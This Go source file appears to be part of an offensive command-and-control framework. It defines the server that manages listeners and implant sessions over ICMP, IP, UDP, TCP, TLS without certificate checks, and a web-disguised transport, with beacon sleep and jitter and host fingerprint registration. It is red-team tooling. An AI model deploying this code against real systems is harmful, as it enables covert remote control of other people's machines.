package c2

import (
	"context"
	"strings"

	"github.com/PurpleSec/logx"
	"github.com/iDigitalFlame/xmt/com"
	"github.com/iDigitalFlame/xmt/com/limits"
	"github.com/iDigitalFlame/xmt/com/wc2"
	"github.com/iDigitalFlame/xmt/data"
	"github.com/iDigitalFlame/xmt/device"
	"github.com/iDigitalFlame/xmt/util"
	"github.com/iDigitalFlame/xmt/util/text"
	"github.com/iDigitalFlame/xmt/util/xerr"
)

const (
	flagOpen uint32 = 0
	flagLast uint32 = iota
	flagClose
	flagOption
	flagFinished
)

var (
	// Default is the default Server instance. This can be used to directly use a client without having to
	// setup a Server instance first. This instance will use the 'NOP' logger, as logging is not needed.
	Default = NewServerContext(context.Background(), logx.NOP)

	// ErrNoConnector is a error returned by the Connect and Listen functions when the Connector is nil and the
	// provided Profile is also nil or does not contain a connection hint.
	ErrNoConnector = xerr.New("invalid or missing connector")
	// ErrEmptyPacket is a error returned by the Connect function when the expected return result from the
	// server was invalid or not expected.
	ErrEmptyPacket = xerr.New("server sent an invalid response")
)

// Server is the manager for all C2 Listener and Sessions connection and states. This struct also manages all
// events and connection changes.
type Server struct {
	Log       logx.Log
	Scheduler *Scheduler

	ch     chan waker
	ctx    context.Context
	new    chan *Listener
	close  chan string
	events chan event
	cancel context.CancelFunc
	active map[string]*Listener
}

// Wait will block until the current Server is closed and shutdown.
func (s *Server) Wait() {
	<-s.ch
}
func (s *Server) listen() {
	s.Log.Debug("Server processing thread started!")
	for {
		select {
		case <-s.ctx.Done():
			s.shutdown()
			return
		case l := <-s.new:
			s.active[l.name] = l
		case r := <-s.close:
			delete(s.active, r)
		case e := <-s.events:
			e.process(s.Log)
		}
	}
}
func (s *Server) shutdown() {
	if s.Log == nil {
		s.Log = logx.NOP
	}
	s.cancel()
	for _, v := range s.active {
		v.Close()
	}
	for len(s.active) > 0 {
		delete(s.active, <-s.close)
	}
	s.Log.Debug("Stopping Server.")
	s.active = nil
	close(s.new)
	close(s.close)
	close(s.events)
	close(s.ch)
}

// Close stops the processing thread from this Server and releases all associated resources. This will
// signal the shutdown of all attached Listeners and Sessions.
func (s *Server) Close() error {
	s.cancel()
	s.Wait()
	return nil
}

// IsActive returns true if this Controller is still able to Process events.
func (s *Server) IsActive() bool {
	return s.ctx.Err() == nil
}

// NewServer creates a new Server instance for managing C2 Listeners and Sessions. If the supplied Log is
// nil, the 'logx.NOP' log will be used.
func NewServer(l logx.Log) *Server {
	return NewServerContext(context.Background(), l)
}

// Connected returns an array of all the current Sessions connected to Listeners connected to this Server.
func (s *Server) Connected() []*Session {
	var l []*Session
	for _, v := range s.active {
		l = append(l, v.Connected()...)
	}
	return l
}
func convertHintConnect(s Setting) client {
	if len(s) == 0 {
		return nil
	}
	switch s[0] {
	case ipID:
		if s[1] == 1 {
			return com.ICMP
		}
		return com.NewIP(s[1], DefaultSleep)
	case udpID:
		return com.UDP
	case tcpID:
		return com.TCP
	case tlsID:
		if len(s) > 1 {
			return com.TLSNoCheck
		}
		return com.TLS
	case wc2ID:
		_ = s[6]
		var (
			c       = 6
			al      = uint16(uint64(s[2]) | uint64(s[1])<<8)
			ul      = uint16(uint64(s[4]) | uint64(s[3])<<8)
			hl      = s[5]
			a, u, h text.Matcher
		)
		if al > 0 {
			a = text.Matcher(string(s[c : c+int(al)]))
			c += int(al)
		}
		if ul > 0 {
			u = text.Matcher(string(s[c : c+int(ul)]))
			c += int(ul)
		}
		if hl > 0 {
			h = text.Matcher(string(s[c : c+int(hl)]))
			c += int(hl)
		}
		return &wc2.Client{Generator: wc2.Generator{URL: u, Host: h, Agent: a}}
	}
	return nil
}

// EnableRPC will enable the JSON RPC listener at the following address. The RPC listener can be used to instruct and
// control the Server, as well as view Session information. An error may be returned if the current listening address
// is in use.
func (s *Server) EnableRPC(a string) error {
	// TODO: Finish RPC
	return nil
}
func convertHintListen(s Setting) listener {
	if len(s) == 0 {
		return nil
	}
	switch s[0] {
	case ipID:
		if s[1] == 1 {
			return com.ICMP
		}
		return com.NewIP(s[1], DefaultSleep)
	case udpID:
		return com.UDP
	case tcpID:
		return com.TCP
	}
	return nil
}

// MarshalJSON fulfils the JSON Marshaler interface.
func (s *Server) MarshalJSON() ([]byte, error) {
	b := buffers.Get().(*data.Chunk)
	b.Write([]byte(`{"tasks":`))
	s.Scheduler.json(b)
	b.Write([]byte(`,"listeners": {`))
	i := 0
	for k, v := range s.active {
		if i > 0 {
			b.WriteUint8(uint8(','))
		}
		b.Write([]byte(`"` + k + `":`))
		v.json(b)
		i++
	}
	b.Write([]byte(`}}`))
	d := b.Payload()
	returnBuffer(b)
	return d, nil
}

// ConnectQuick creates a Session using the supplied Profile to connect to the listening server specified. A Session
// will be returned if the connection handshake succeeds. The '*Quick' functions infers the default Profile. This
// function uses the Default Server instance.
func ConnectQuick(a string, c client) (*Session, error) {
	return Default.ConnectWith(a, c, DefaultProfile, nil)
}

// OneshotQuick sends the packet with the specified data to the server and does NOT register the device
// with the Server. This is used for spending specific data segments in single use connections. The '*Quick' functions
// infers the default Profile. This function uses the Default Server instance.
func OneshotQuick(a string, c client, d *com.Packet) error {
	return Default.Oneshot(a, c, DefaultProfile, d)
}

// NewServerContext creates a new Server instance for managing C2 Listeners and Sessions. If the supplied Log is
// nil, the 'logx.NOP' log will be used. This function will use the supplied Context as the base context for
// cancelation.
func NewServerContext(x context.Context, l logx.Log) *Server {
	s := &Server{
		ch:        make(chan waker, 1),
		Log:       l,
		new:       make(chan *Listener, 16),
		close:     make(chan string, 16),
		active:    make(map[string]*Listener),
		events:    make(chan event, limits.SmallLimit()),
		Scheduler: new(Scheduler),
	}
	s.Scheduler.s = s
	s.ctx, s.cancel = context.WithCancel(x)
	if s.Log == nil {
		s.Log = logx.NOP
	}
	go s.listen()
	return s
}

// Connect creates a Session using the supplied Profile to connect to the listening server specified. A Session
// will be returned if the connection handshake succeeds. This function uses the Default Server instance.
func Connect(a string, c client, p *Profile) (*Session, error) {
	return Default.ConnectWith(a, c, p, nil)
}

// Oneshot sends the packet with the specified data to the server and does NOT register the device with the
// Server. This is used for spending specific data segments in single use connections. This function uses the
// Default Server instance.
func Oneshot(a string, c client, p *Profile, d *com.Packet) error {
	return Default.Oneshot(a, c, p, d)
}

// ConnectQuick creates a Session using the supplied Profile to connect to the listening server specified. A Session
// will be returned if the connection handshake succeeds. The '*Quick' functions infers the default Profile.
func (s *Server) ConnectQuick(a string, c client) (*Session, error) {
	return s.ConnectWith(a, c, DefaultProfile, nil)
}

// Listen adds the Listener under the name provided. A Listener struct to control and receive callback functions
// is added to assist in manageing connections to this Listener. This function uses the Default Server instance.
func Listen(n, b string, c listener, p *Profile) (*Listener, error) {
	return Default.Listen(n, b, c, p)
}

// OneshotQuick sends the packet with the specified data to the server and does NOT register the device
// with the Server. This is used for spending specific data segments in single use connections. The '*Quick' functions
// infers the default Profile.
func (s *Server) OneshotQuick(a string, c client, d *com.Packet) error {
	return s.Oneshot(a, c, DefaultProfile, d)
}

// Connect creates a Session using the supplied Profile to connect to the listening server specified. A Session
// will be returned if the connection handshake succeeds.
func (s *Server) Connect(a string, c client, p *Profile) (*Session, error) {
	return s.ConnectWith(a, c, p, nil)
}

// Oneshot sends the packet with the specified data to the server and does NOT register the device with the
// Server. This is used for spending specific data segments in single use connections.
func (s *Server) Oneshot(a string, c client, p *Profile, d *com.Packet) error {
	if c == nil && p != nil {
		c = convertHintConnect(p.hint)
	}
	if c == nil {
		return ErrNoConnector
	}
	var (
		w Wrapper
		t Transform
	)
	if p != nil {
		w = p.Wrapper
		t = p.Transform
	}
	n, err := c.Connect(a)
	if err != nil {
		return xerr.Wrap("unable to connect to "+a, err)
	}
	if d == nil {
		d = &com.Packet{ID: MvNop}
	}
	d.Flags |= com.FlagOneshot
	err = writePacket(n, w, t, d)
	if n.Close(); err != nil {
		return xerr.Wrap("unable to write packet", err)
	}
	return nil
}

// Listen adds the Listener under the name provided. A Listener struct to control and receive callback functions
// is added to assist in manageing connections to this Listener.
func (s *Server) Listen(n, b string, c listener, p *Profile) (*Listener, error) {
	if c == nil && p != nil {
		c = convertHintListen(p.hint)
	}
	if c == nil {
		return nil, ErrNoConnector
	}
	x := strings.ToLower(n)
	if _, ok := s.active[x]; ok {
		return nil, xerr.New("listener " + x + " is already active")
	}
	h, err := c.Listen(b)
	if err != nil {
		return nil, xerr.Wrap("unable to listen on "+b, err)
	}
	if h == nil {
		return nil, xerr.New("unable to listen on " + b)
	}
	if s.Log == nil {
		s.Log = logx.NOP
	}
	l := &Listener{
		ch:         make(chan waker, 1),
		name:       x,
		close:      make(chan uint32, 64),
		sessions:   make(map[uint32]*Session),
		listener:   h,
		connection: connection{s: s, log: s.Log, Mux: s.Scheduler},
	}
	if p != nil {
		l.size = p.Size
		l.w, l.t = p.Wrapper, p.Transform
	}
	if l.size == 0 {
		l.size = uint(limits.MediumLimit())
	}
	l.ctx, l.cancel = context.WithCancel(s.ctx)
	s.Log.Debug("[%s] Added Listener on %q!", x, b)
	s.new <- l
	go l.listen()
	return l, nil
}

// ConnectWith creates a Session using the supplied Profile to connect to the listening server specified. This
// function allows for passing the data Packet specified to the server with the initial registration. The data
// will be passed on normally. This function uses the Default Server instance.
func ConnectWith(a string, c client, p *Profile, d *com.Packet) (*Session, error) {
	return Default.ConnectWith(a, c, p, d)
}

// ConnectWith creates a Session using the supplied Profile to connect to the listening server specified. This
// function allows for passing the data Packet specified to the server with the initial registration. The data
// will be passed on normally.
func (s *Server) ConnectWith(a string, c client, p *Profile, d *com.Packet) (*Session, error) {
	if c == nil && p != nil {
		c = convertHintConnect(p.hint)
	}
	if c == nil {
		return nil, ErrNoConnector
	}
	n, err := c.Connect(a)
	if err != nil {
		return nil, xerr.Wrap("unable to connect to "+a, err)
	}
	defer n.Close()
	var (
		x uint
		l = &Session{ID: device.UUID, host: a, Device: *device.Local.Machine}
		v = &com.Packet{ID: MvHello, Device: l.ID, Job: uint16(util.FastRand())}
	)
	if p != nil {
		l.sleep, l.jitter = p.Sleep, uint8(p.Jitter)
		l.w, l.t, x = p.Wrapper, p.Transform, p.Size
	}
	if l.sleep == 0 {
		l.sleep = DefaultSleep
	}
	if l.jitter > 100 {
		l.jitter = DefaultJitter
	}
	if l.Device.MarshalStream(v); d != nil {
		d.MarshalStream(v)
		v.Flags |= com.FlagData
	}
	v.Close()
	if err := writePacket(n, l.w, l.t, v); err != nil {
		return nil, xerr.Wrap("unable to write Packet", err)
	}
	r, err := readPacket(n, l.w, l.t)
	if err != nil {
		return nil, xerr.Wrap("unable to read Packet", err)
	}
	if r == nil || r.ID != MvComplete {
		return nil, ErrEmptyPacket
	}
	if s.Log == nil {
		s.Log = logx.NOP
	}
	if s.Log.Debug("[%s] Client connected to %q!", l.ID, a); x == 0 {
		x = uint(limits.MediumLimit())
	}
	l.socket = c.Connect
	l.frags = make(map[uint16]*cluster)
	l.ctx, l.cancel = context.WithCancel(s.ctx)
	l.log, l.s, l.Mux = s.Log, s, DefaultClientMux
	l.wake, l.ch = make(chan waker, 1), make(chan waker, 1)
	l.send, l.recv = make(chan *com.Packet, x), make(chan *com.Packet, x)
	go l.listen()
	return l, nil
}
